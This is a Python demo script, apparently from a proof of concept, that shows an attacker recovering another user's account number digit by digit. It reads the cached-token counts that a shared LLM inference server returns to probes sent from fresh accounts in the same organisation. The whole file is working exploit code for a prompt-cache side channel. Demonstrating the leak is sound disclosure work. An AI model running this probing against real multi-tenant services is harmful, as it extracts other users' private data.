#!/usr/bin/env python3
"""Eve recovers Alice's account number from the server's cached-token counts.

    python demo/eve.py [--url http://127.0.0.1:30000] [--show-raw]

Eve knows only how Alice's message starts ("My account number is "). She does
not know the number or even its length. For each position she sends ten
requests, one per digit, each from a fresh account in Alice's org, and keeps
the digit whose reply reports one more cached token than the other nine. She
stops when no digit stands out.
"""

from __future__ import annotations

import argparse
import sys

from common import PREFIX, chat, cached_tokens, client, dump, gateway

MAX_DIGITS = 12


def extract(server, model: str, mint, out=print, show_raw: bool = False) -> str:
    known = ""
    for pos in range(1, MAX_DIGITS + 1):
        counts, raw = {}, {}
        for d in "0123456789":
            status, resp = chat(server, model, mint(f"eve-{pos}{d}"), f"{PREFIX}{known}{d}")
            if status != 200:
                raise SystemExit(f"probe failed with HTTP {status}")
            counts[d], raw[d] = cached_tokens(resp) or 0, resp
        top = max(counts.values())
        best = [d for d in counts if counts[d] == top]
        row = "  ".join(f"{d}:{counts[d]}" for d in counts)
        if len(best) != 1:
            out(f"digit {pos}: {row}   -> no digit stands out; stopping")
            break
        known += best[0]
        out(f"digit {pos}: {row}   -> {best[0]}   so far: {known}")
        if show_raw and pos == 1:
            out(f"  raw usage for probe '{PREFIX}{best[0]}':\n{dump(raw[best[0]])}")
    return known


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:30000")
    ap.add_argument("--model", default="Qwen/Qwen3-8B")
    ap.add_argument("--show-raw", action="store_true", help="print the server's raw usage block for one probe")
    a = ap.parse_args()
    print(f"Eve knows only the opening: '{PREFIX}...'", flush=True)
    got = extract(client(a.url), a.model, gateway(), out=lambda s: print(s, flush=True), show_raw=a.show_raw)
    print(f"\nEve's result: {got if got else '(nothing)'}", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
